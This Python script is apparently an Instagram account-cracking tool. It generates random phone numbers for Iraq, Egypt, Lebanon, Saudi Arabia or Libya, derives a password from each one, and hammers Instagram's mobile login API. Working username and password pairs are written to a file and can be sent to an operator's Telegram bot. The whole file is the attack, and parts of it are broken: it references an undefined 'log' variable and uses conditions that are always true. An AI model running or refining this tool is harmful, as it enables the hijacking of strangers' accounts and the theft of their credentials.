try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()

try:
    import requests
except ImportError:
    os.system('pip install clear')
    import requests
    clear()
import os
import sys
import requests
try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()
try:
    from colored import fg
except ImportError:
    os.system('pip install colored')
    from colored import fg
    clear()
try:
    from uuid import uuid4
except ImportError:
    os.system('pip install uuid')
    from uuid import uuid4
    clear()
try:
    import random
except ImportError:
    os.system('pip install random')
    import random
    clear()
color3 = fg(2)
color4 = fg('9')    
print('__________________________')
def close():
    input('- Press Enter To Exit /')
    sys.exit()
print("\n[✔️] KORD ")
h,b,s,block = 0,0,0,0
tele = input("[🇸🇾] Send Hits To Telegram Y/N ?: ")
if "Y" in tele:
    id = input("[+] EᑎTEᖇ Iᗪ TEᒪE 𖢎 : ")
    bot = input("[+] 𝘌𝘕𝘛𝘌𝘙 𝘛𝘖𝘒𝘌𝘕 𝘉𝘖𝘛 𖥋 𝐁𝐎𝐓 : ")
elif "y" in tele:
    id = input("[+] Enter Id Tele : ")
    bot = input("[+] 𝐄𝐍𝐓𝐄𝐑 𝐓𝐎𝐊𝐄𝐍 𝐁𝐎𝐓 : ")
print("==========================") 
ask = input('[1] دولة العراق\n\n[2] دولة مصر                                                       \n[3] دولة لبنان                                         \n \n[4]دولة السعوديه                                      \n      \n[5]دولة ليبيا                                         \n============KORDESTAN=================\n[+] اختر الدولة  : ')
if ask == '1':
                            make = '0987654321'
                            print('')
                            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                            while True:
                                us = str(''.join((random.choice(make) for i in range(8))))
                                user = '+96477' + us
                                pasw = '077' + us
                                req = requests.session()
                                log_head = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
                                 'Accept':'*/*', 
                                 'Cookie':'missing', 
                                 'Accept-Encoding':'gzip, deflate', 
                                 'Accept-Language':'en-US', 
                                 'X-IG-Capabilities':'3brTvw==', 
                                 'X-IG-Connection-Type':'WIFI', 
                                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                                 'Host':'i.instagram.com'}
                                uid = str(uuid4())
                                log_data = {'uuid':uid, 
                                 'password':pasw, 
                                 'username':user, 
                                 'device_id':uid, 
                                 'from_reg':'false', 
                                 '_csrftoken':'missing', 
                                 'login_attempt_countn':'0'}
                                r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
                                if 'logged_in_user' in r.text:
                                    if not 'Y':
                                        if 'y' in tele:
                                            t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=ʜɪ ɴᴏᴊᴅᴀʀ ɴᴇᴡ ᴀᴄᴄᴏụɴᴛ  🤪 HI،\n====================\n[=] ᴜѕᴇʀ   : {user} \n[=] 𝙿𝙰𝚂𝚂  : {pasw}\n====================\nBY : @URURB - @bb_202")
                                        open('Hits.txt', 'a').write(f"{user}:{pasw}\n")
                                        h += 1
                                        print(f"\x1b[1;91m                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                    else:
                                        if 'check your username' or 'The password you entered is incorrect.' or 'unusable_password' in log.text:
                                            b += 1
                                            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                else:
                                    if 'check your username' or 'The password you entered is incorrect.' or 'unusable_password' in log.text:
                                        b += 1
                                        print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                if 'challenge_required' or 'two' in log.text:
                                    s += 1
                                    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                elif 'Please wait a few minutes' in log.text:
                                    block += 1
                                    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                elif 'Bad request' in log.text:
                                    b += 1
                                    print(f"\r                  [=]Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                else:
                                    b += 1
                                    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
#KORD
if ask == '2':
                            make = '0987654321'
                            print('')
                            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                            while True:
                                us = str(''.join((random.choice(make) for i in range(8))))
                                user = '+2010' + us
                                pasw = '10' + us
                                req = requests.session()
                                log_head = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
                                 'Accept':'*/*', 
                                 'Cookie':'missing', 
                                 'Accept-Encoding':'gzip, deflate', 
                                 'Accept-Language':'en-US', 
                                 'X-IG-Capabilities':'3brTvw==', 
                                 'X-IG-Connection-Type':'WIFI', 
                                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                                 'Host':'i.instagram.com'}
                                uid = str(uuid4())
                                log_data = {'uuid':uid, 
                                 'password':pasw, 
                                 'username':user, 
                                 'device_id':uid, 
                                 'from_reg':'false', 
                                 '_csrftoken':'missing', 
                                 'login_attempt_countn':'0'}
                                r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
                                if 'logged_in_user' in r.text:
                                    if not 'Y':
                                        if 'y' in tele:
                                            t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=ʜɪ ɴᴏᴊᴅᴀʀ ɴᴇᴡ ᴀᴄᴄᴏụɴᴛ  🤪 HI،\n====================\n[=] ᴜѕᴇʀ   : {user} \n[=] 𝙿𝙰𝚂𝚂  : {pasw}\n====================\nBY : @bb_202 - @URURB")
                                        open('Hits.txt', 'a').write(f"{user}:{pasw}\n")
                                        h += 1
                                        print(f"\x1b[1;91m                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                    else:
                                        if 'check your username' or 'The password you entered is incorrect.' or 'unusable_password' in log.text:
                                            b += 1
                                            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                else:
                                    if 'check your username' or 'The password you entered is incorrect.' or 'unusable_password' in log.text:
                                        b += 1
                                        print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                if 'challenge_required' or 'two' in log.text:
                                    s += 1
                                    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                elif 'Please wait a few minutes' in log.text:
                                    block += 1
                                    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                elif 'Bad request' in log.text:
                                    b += 1
                                    print(f"\r                  [=]Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                else:
                                    b += 1
                                    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')

                            make = '0123456789'
                            print('')
                            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                            make = '0123456789'
                            print('')
                            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')

#KORD
if ask == '3':
                            make = '0987654321'
                            print('')
                            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                            while True:
                                us = str(''.join((random.choice(make) for i in range(6))))
                                user = '+96176' + us
                                pasw = '76' + us
                                req = requests.session()
                                log_head = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
                                 'Accept':'*/*', 
                                 'Cookie':'missing', 
                                 'Accept-Encoding':'gzip, deflate', 
                                 'Accept-Language':'en-US', 
                                 'X-IG-Capabilities':'3brTvw==', 
                                 'X-IG-Connection-Type':'WIFI', 
                                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                                 'Host':'i.instagram.com'}
                                uid = str(uuid4())
                                log_data = {'uuid':uid, 
                                 'password':pasw, 
                                 'username':user, 
                                 'device_id':uid, 
                                 'from_reg':'false', 
                                 '_csrftoken':'missing', 
                                 'login_attempt_countn':'0'}
                                r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
                                if 'logged_in_user' in r.text:
                                    if not 'Y':
                                        if 'y' in tele:
                                            t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=ʜɪ ɴᴏᴊᴅᴀʀ ɴᴇᴡ ᴀᴄᴄᴏụɴᴛ  🤪 IH،\n====================\n[=] ᴜѕᴇʀ   : {user} \n[=] 𝙿𝙰𝚂𝚂  : {pasw}\n====================\nBY : @bb_202 - @URURB")
                                        open('Hits.txt', 'a').write(f"{user}:{pasw}\n")
                                        h += 1
                                        print(f"\x1b[1;91m                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                    else:
                                        if 'check your username' or 'The password you entered is incorrect.' or 'unusable_password' in log.text:
                                            b += 1
                                            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                else:
                                    if 'check your username' or 'The password you entered is incorrect.' or 'unusable_password' in log.text:
                                        b += 1
                                        print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                if 'challenge_required' or 'two' in log.text:
                                    s += 1
                                    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                elif 'Please wait a few minutes' in log.text:
                                    block += 1
                                    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                elif 'Bad request' in log.text:
                                    b += 1
                                    print(f"\r                  [=]Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                else:
                                    b += 1
                                    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')

#KORD
if ask == '4':
                            make = '0123456789'
                            print('')
                            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                            while True:
                                us = str(''.join((random.choice(make) for i in range(7))))
                                user = '+96650' + us
                                pasw = '50' + us
                                req = requests.session()
                                log_head = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
                                 'Accept':'*/*', 
                                 'Cookie':'missing', 
                                 'Accept-Encoding':'gzip, deflate', 
                                 'Accept-Language':'en-US', 
                                 'X-IG-Capabilities':'3brTvw==', 
                                 'X-IG-Connection-Type':'WIFI', 
                                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                                 'Host':'i.instagram.com'}
                                uid = str(uuid4())
                                log_data = {'uuid':uid, 
                                 'password':pasw, 
                                 'username':user, 
                                 'device_id':uid, 
                                 'from_reg':'false', 
                                 '_csrftoken':'missing', 
                                 'login_attempt_countn':'0'}
                                r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
                                if 'logged_in_user' in r.text:
                                    if not 'Y':
                                        if 'y' in tele:
                                            t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=ʜɪ ɴᴏᴊᴅᴀʀ ɴᴇᴡ ᴀᴄᴄᴏụɴᴛ  🤪 HI،\n====================\n[=] ᴜѕᴇʀ   : {user} \n[=] 𝙿𝙰𝚂𝚂  : {pasw}\n====================\nBY : @bb_202 - @URURB")
                                        open('Hits.txt', 'a').write(f"{user}:{pasw}\n")
                                        h += 1
                                        print(f"\x1b[1;91m                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                    else:
                                        if 'check your username' or 'The password you entered is incorrect.' or 'unusable_password' in log.text:
                                            b += 1
                                            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                else:
                                    if 'check your username' or 'The password you entered is incorrect.' or 'unusable_password' in log.text:
                                        b += 1
                                        print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                if 'challenge_required' or 'two' in log.text:
                                    s += 1
                                    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                elif 'Please wait a few minutes' in log.text:
                                    block += 1
                                    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                elif 'Bad request' in log.text:
                                    b += 1
                                    print(f"\r                  [=]Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                else:
                                    b += 1
                                    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')

#KORD
if ask == '5':
                            make = '0123456789'
                            print('')
                            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                            us = str(''.join((random.choice(make) for i in range(7))))
                            user = '+218' + us
                            pasw = '091' + us
                            req = requests.session()
                            log_head = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
                             'Accept':'*/*', 
                             'Cookie':'missing', 
                             'Accept-Encoding':'gzip, deflate', 
                             'Accept-Language':'en-US', 
                             'X-IG-Capabilities':'3brTvw==', 
                             'X-IG-Connection-Type':'WIFI', 
                             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                             'Host':'i.instagram.com'}
                            uid = str(uuid4())
                            log_data = {'uuid':uid, 
                             'password':pasw, 
                             'username':user, 
                             'device_id':uid, 
                             'from_reg':'false', 
                             '_csrftoken':'missing', 
                             'login_attempt_countn':'0'}
                            r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
                            if 'logged_in_user' in r.text:
                                if not 'Y':
                                    if 'y' in tele:
                                        t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=ʜɪ ɴᴏᴊᴅᴀʀ ɴᴇᴡ ᴀᴄᴄᴏụɴᴛ  🤪 IH،\n====================\n[=] ᴜѕᴇʀ   : {user} \n[=] 𝙿𝙰𝚂𝚂  : {pasw}\n====================\nBY : @bb_202 - @URURB")
                                    open('Hits.txt', 'a').write(f"{user}:{pasw}\n")
                                    h += 1
                                    print(f"\x1b[1;91m                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                                else:
                                    if 'check your username' or 'The password you entered is incorrect.' or 'unusable_password' in log.text:
                                        b += 1
                                        print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                            else:
                                if 'check your username' or 'The password you entered is incorrect.' or 'unusable_password' in log.text:
                                    b += 1
                                    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                            if 'challenge_required' or 'two' in log.text:
                                s += 1
                                print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                            elif 'Please wait a few minutes' in log.text:
                                block += 1
                                print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                            elif 'Bad request' in log.text:
                                b += 1
                                print(f"\r                  [=]Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')
                            else:
                                b += 1
                                print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}", end='')

